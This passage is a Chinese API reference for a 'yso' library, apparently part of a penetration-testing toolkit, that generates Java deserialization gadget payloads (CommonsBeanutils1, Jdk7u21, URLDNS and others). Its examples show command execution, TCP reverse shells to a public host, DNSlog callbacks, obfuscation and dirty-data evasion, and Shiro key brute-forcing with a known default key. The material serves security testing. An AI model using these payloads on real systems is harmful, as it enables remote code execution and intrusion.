|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetJavaObjectFromBytes

#### 详细描述
GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。

此函数使用ParseJavaSerialized方法来解析提供的字节序列，

并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空，

函数将返回错误。如果解析成功，它将返回解析出的第一个Java对象。

byt：要解析的字节数组。

返回：成功时返回第一个Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
raw := "rO0..." // base64 Java serialized object
bytes = codec.DecodeBase64(raw)~ // base64解码
javaObject, err := yso.GetJavaObjectFromBytes(bytes) // 从字节中解析Java对象
```


#### 定义

`GetJavaObjectFromBytes(byt []byte) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| byt | `[]byte` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetJavassistWeld1JavaObject

#### 详细描述
GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJavassistWeld1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetJdk7u21JavaObject

#### 详细描述
GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJdk7u21JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetJdk8u20JavaObject

#### 详细描述
GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJdk8u20JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetSimplePrincipalCollectionJavaObject

#### 详细描述
GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。

主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。

使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。

Example:
```
javaObject, _ = yso.GetSimplePrincipalCollectionJavaObject()
classBytes,_ = yso.ToBytes(javaObject)
data = codec.PKCS5Padding(classBytes, 16)
keyDecoded,err = codec.DecodeBase64("kPH+bIxk5D2deZiIxcaaaA==")
iv = []byte(ramdstr(16))
cipherText ,_ = codec.AESCBCEncrypt(keyDecoded, data, iv)
payload = codec.EncodeBase64(append(iv, cipherText...))
发送 payload
```


#### 定义

`GetSimplePrincipalCollectionJavaObject() (*JavaObject, error)`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetURLDNSJavaObject

#### 详细描述
GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。

这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。

url：要在生成的Java对象中设置的URL字符串。

返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
url, token, _ = risk.NewDNSLogDomain()
javaObject, _ = yso.GetURLDNSJavaObject(url)
gadgetBytes,_ = yso.ToBytes(javaObject)
使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
res,err = risk.CheckDNSLogByToken(token)

	if err {
	  //dnslog查询失败
	} else {
	  if len(res) > 0{
	   // dnslog查询成功
	  }
	}

```


#### 定义

`GetURLDNSJavaObject(url string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| url | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### LoadClassFromBCEL

#### 详细描述
LoadClassFromBCEL 将BCEL（Byte Code Engineering Library）格式的Java类数据转换为字节数组，

并从这些字节中加载并返回一个javaclassparser.ClassObject对象。

这个函数首先使用javaclassparser.Bcel2bytes转换BCEL格式的数据，然后利用GenerateClassObjectFromBytes生成类对象。

可通过可变参数`options`来定制类对象的特定属性或行为。

data：BCEL格式的Java类数据。

options：用于配置类对象的可变参数函数列表。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
bcelData := "$$BECL$$..." // 假设的BCEL数据
classObject, err := LoadClassFromBCEL(bcelData, option1, option2) // 从BCEL数据加载并配置类对象
```


#### 定义

`LoadClassFromBCEL(data string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| data | `string` |   |
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### LoadClassFromBase64

#### 详细描述
LoadClassFromBase64 从base64编码的字符串中加载并返回一个javaclassparser.ClassObject对象。

这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。

这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。

base64：要从中加载类对象的base64编码字符串。

options：用于配置类对象的可变参数函数列表。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
classObject, _ := yso.LoadClassFromBytes("yv66vg...") // 从字节中加载并配置类对象
```


#### 定义

`LoadClassFromBase64(base64 string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| base64 | `string` |   |
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### LoadClassFromBytes

#### 详细描述
LoadClassFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。

这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。

这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。

bytes：要从中加载类对象的字节数组。

options：用于配置类对象的可变参数函数列表。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
bytesCode,_ =codec.DecodeBase64("yv66vg...")
classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
```


#### 定义

`LoadClassFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| bytes | `[]byte` |   |
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### ToBcel

#### 详细描述
ToBcel 将 Java 类对象转换为 BCEL 编码格式的字符串

Example:
```
classObj := &javaclassparser.ClassObject{...}
bcelStr, err := yso.ToBcel(classObj)
```


#### 定义

`ToBcel(i any) (string, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| i | `any` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `string` |   |
| r2 | `error` |   |


### ToBytes

#### 详细描述
ToBytes 将 Java 或反序列化对象转换为字节码

Example:
```
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000),yso.twoBytesCharString())
```


#### 定义

`ToBytes(i any, opts ...MarshalOptionFun) ([]byte, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| i | `any` |   |
| opts | `...MarshalOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `[]byte` |   |
| r2 | `error` |   |


### ToJson

#### 详细描述
ToJson 将 Java 或反序列化对象转换为 json 字符串

Example:
```
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetJson,_ = yso.ToJson(gadgetObj)
```


#### 定义

`ToJson(i any) (string, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| i | `any` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `string` |   |
| r2 | `error` |   |


### command

#### 详细描述
SetExecCommand

command 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())
```


#### 定义

`command(cmd string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### dirtyDataLength

#### 详细描述
SetToBytesDirtyDataLength 设置序列化数据中脏数据的长度

length: 要设置的脏数据长度

Example:
```
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000))
```


#### 定义

`dirtyDataLength(length int) MarshalOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| length | `int` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `MarshalOptionFun` |   |


### dnslogDomain

#### 详细描述
SetDnslog

dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。

addr：要设置的 Dnslog 域名。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
```


#### 定义

`dnslogDomain(addr string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| addr | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### dump

#### 详细描述
dump 将Java 对象转换为类 Java 代码

Example:
```
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetDump,_ = yso.dump(gadgetObj)
```


#### 定义

`dump(i any) (string, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| i | `any` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `string` |   |
| r2 | `error` |   |


### evilClassName

#### 详细描述
SetClassName

evilClassName 请求参数选项函数，用于设置生成的类名。

className：要设置的类名。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
```


#### 定义

`evilClassName(className string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| className | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### majorVersion

#### 详细描述


#### 定义

`majorVersion(v uint16) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| v | `uint16` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### obfuscationClassConstantPool

#### 详细描述


#### 定义

`obfuscationClassConstantPool()`


### springEchoBody

#### 详细描述


#### 定义

`springEchoBody()`


### springHeader

#### 详细描述
SetHeader

springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。

需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。

key：要设置的 header 键。

val：要设置的 header 值。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
```


#### 定义

`springHeader(key string, val string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| key | `string` |   |
| val | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### springParam

#### 详细描述
SetParam

springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。

param：要设置的请求参数。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
```


#### 定义

`springParam(val string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| val | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### springRuntimeExecAction

#### 详细描述


#### 定义

`springRuntimeExecAction()`


### tcpReverseHost

#### 详细描述
SetTcpReverseHost

tcpReverseHost 请求参数选项函数，设置指定的 tcpReverseHost 域名，需要配合 useTcpReverseTemplate ，tcpReversePort 使用。

还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。

host：要设置的 tcpReverseHost 的host。

Example:
```
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
```


#### 定义

`tcpReverseHost(host string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| host | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### tcpReversePort

#### 详细描述
SetTcpReversePort

tcpReversePort 请求参数选项函数，设置指定的 tcpReversePort 域名，需要配合 useTcpReverseTemplate ，tcpReverseHost 使用。

还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。

port：要设置的 tcpReversePort 的port。

Example:
```
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
```


#### 定义

`tcpReversePort(port int) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| port | `int` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### tcpReverseToken

#### 详细描述
SetTcpReverseToken

tcpReverseToken 请求参数选项函数，设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。

token：要设置的 token 。

Example:
```
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
```


#### 定义

`tcpReverseToken(token string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| token | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### threeBytesCharString

#### 详细描述


#### 定义

`threeBytesCharString()`


### twoBytesCharString

#### 详细描述


#### 定义

`twoBytesCharString()`


### useBase64BytesClass

#### 详细描述
SetClassBase64Bytes

useBase64BytesClass 请求参数选项函数，传入base64编码的字节码。

base64：base64编码的字节码。

Example:
```
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBase64BytesClass(base64Class))
```


#### 定义

`useBase64BytesClass(base64 string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| base64 | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useBytesClass

#### 详细描述
SetClassBytes

useBytesClass 请求参数选项函数，传入字节码。

data：字节码。

Example:
```
bytesCode,_ =codec.DecodeBase64(bytes)
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesClass(bytesCode))
```


#### 定义

`useBytesClass(data []byte) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| data | `[]byte` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useBytesEvilClass

#### 详细描述
SetBytesEvilClass

useBytesEvilClass 请求参数选项函数，传入自定义的字节码。

data：自定义的字节码。

Example:
```
bytesCode,_ =codec.DecodeBase64(bytes)
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode))
```


#### 定义

`useBytesEvilClass(data []byte) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| data | `[]byte` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useClassMultiEchoTemplate

#### 详细描述


#### 定义

`useClassMultiEchoTemplate()`


### useClassParam

#### 详细描述
SetClassParam 设置类生成时的参数

k: 参数名

v: 参数值

Example:
```
classObj,_ = yso.GenerateClass(yso.useClassParam("command","whoami"))
```


#### 定义

`useClassParam(k string, v string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| k | `string` |   |
| v | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useConstructorExecutor

#### 详细描述


#### 定义

`useConstructorExecutor()`


### useDNSLogEvilClass

#### 详细描述
SetDnslogEvilClass

useDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。

addr：要设置的 Dnslog 域名。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
```


#### 定义

`useDNSLogEvilClass(addr string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| addr | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useDNSlogTemplate

#### 详细描述


#### 定义

`useDNSlogTemplate()`


### useEchoBody

#### 详细描述


#### 定义

`useEchoBody()`


### useHeaderEchoEvilClass

#### 详细描述


#### 定义

`useHeaderEchoEvilClass()`


### useHeaderEchoTemplate

#### 详细描述


#### 定义

`useHeaderEchoTemplate()`


### useHeaderParam

#### 详细描述
SetHeader

springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。

需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。

key：要设置的 header 键。

val：要设置的 header 值。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
```


#### 定义

`useHeaderParam(key string, val string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| key | `string` |   |
| val | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useModifyTomcatMaxHeaderSizeTemplate

#### 详细描述


#### 定义

`useModifyTomcatMaxHeaderSizeTemplate()`


### useMultiEchoEvilClass

#### 详细描述


#### 定义

`useMultiEchoEvilClass()`


### useParam

#### 详细描述
SetParam

springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。

param：要设置的请求参数。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
```


#### 定义

`useParam(val string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| val | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useProcessBuilderExecEvilClass

#### 详细描述
SetProcessBuilderExecEvilClass

useProcessBuilderExecEvilClass 请求参数选项函数，设置生成ProcessBuilderExec类的模板，同时设置要执行的命令。

cmd：要执行的命令字符串。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
```


#### 定义

`useProcessBuilderExecEvilClass(cmd string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useProcessBuilderExecTemplate

#### 详细描述


#### 定义

`useProcessBuilderExecTemplate()`


### useProcessImplExecEvilClass

#### 详细描述
SetProcessImplExecEvilClass

useProcessImplExecEvilClass 请求参数选项函数，设置生成ProcessImplExec类的模板，同时设置要执行的命令。

cmd：要执行的命令字符串。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
```


#### 定义

`useProcessImplExecEvilClass(cmd string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useProcessImplExecTemplate

#### 详细描述


#### 定义

`useProcessImplExecTemplate()`


### useRuntimeExecEvilClass

#### 详细描述
SetRuntimeExecEvilClass

useRuntimeExecEvilClass 请求参数选项函数，设置生成RuntimeExec类的模板，同时设置要执行的命令。

cmd：要执行的命令字符串。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
```


#### 定义

`useRuntimeExecEvilClass(cmd string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useRuntimeExecTemplate

#### 详细描述


#### 定义

`useRuntimeExecTemplate()`


### useSleepEvilClass

#### 详细描述


#### 定义

`useSleepEvilClass()`


### useSleepTemplate

#### 详细描述


#### 定义

`useSleepTemplate()`


### useSleepTime

#### 详细描述
SetSleepTime

useSleepTime 请求参数选项函数，设置指定的 sleep 时长，需要配合 useSleepTemplate 使用，主要用与指定 sleep 时长，用于延时检测gadget。

Example:
```
yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
```


#### 定义

`useSleepTime(time int) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| time | `int` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useSpringEchoTemplate

#### 详细描述


#### 定义

`useSpringEchoTemplate()`


### useTcpReverseEvilClass

#### 详细描述
SetTcpReverseEvilClass

useTcpReverseEvilClass 请求参数选项函数，设置生成TcpReverse类的模板，同时设置指定的 tcpReverseHost ，tcpReversePort。

相当于 useTcpReverseTemplate ，tcpReverseHost  两个个函数的组合。

host：要设置的 tcpReverseHost 的host。

port：要设置的 tcpReversePort 的port。

Example:
```
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host,8080),yso.tcpReverseToken(token))
```


#### 定义

`useTcpReverseEvilClass(host string, port int) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| host | `string` |   |
| port | `int` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useTcpReverseShellEvilClass

#### 详细描述
SetTcpReverseShellEvilClass

useTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。

相当于 useTcpReverseShellTemplate ，tcpReverseShellHost，tcpReverseShellPort  三个个函数的组合。

host：要设置的 tcpReverseShellHost 的host。

port：要设置的 tcpReverseShellPort 的port。

Example:
```
host = "公网IP"
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
```


#### 定义

`useTcpReverseShellEvilClass(host string, port int) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| host | `string` |   |
| port | `int` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useTcpReverseShellTemplate

#### 详细描述


#### 定义

`useTcpReverseShellTemplate()`


### useTcpReverseTemplate

#### 详细描述


#### 定义

`useTcpReverseTemplate()`


### useTemplate

#### 详细描述
SetClassType 设置要生成的类类型

t: 类类型

Example:
```
classObj,_ = yso.GenerateClass(yso.useTemplate("RuntimeExec"))
```


#### 定义

`useTemplate(t ClassType) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| t | `ClassType` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` |   |


### useTomcatEchoEvilClass

#### 详细描述


#### 定义

`useTomcatEchoEvilClass()`


### useTomcatEchoTemplate

#### 详细描述


#### 定义

`useTomcatEchoTemplate()`


